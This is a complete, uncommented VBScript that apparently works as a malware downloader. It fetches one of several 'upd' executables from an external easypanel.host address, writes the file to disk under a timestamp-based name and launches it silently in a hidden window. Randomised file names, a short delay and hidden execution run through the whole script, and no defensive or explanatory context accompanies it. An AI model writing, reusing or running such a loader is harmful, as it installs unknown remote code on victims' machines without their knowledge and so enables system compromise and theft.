Randomize
n = Int(Rnd() * 9) + 1
Set fso  = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("MSXML2.XMLHTTP")
folder = fso.GetParentFolderName(WScript.ScriptFullName)
path = folder & "\st" & CLng(Timer() * 1000) & ".exe"
http.Open "GET", "https://automacoes-remote-control.sgploq.easypanel.host/upd" & n & ".exe", False
http.Send
Set st = CreateObject("ADODB.Stream")
st.Type = 1
st.Open
st.Write http.ResponseBody
st.SaveToFile path, 2
st.Close
WScript.Sleep 3000
Set sh = CreateObject("WScript.Shell")
sh.Run """" & path & """", 0, False
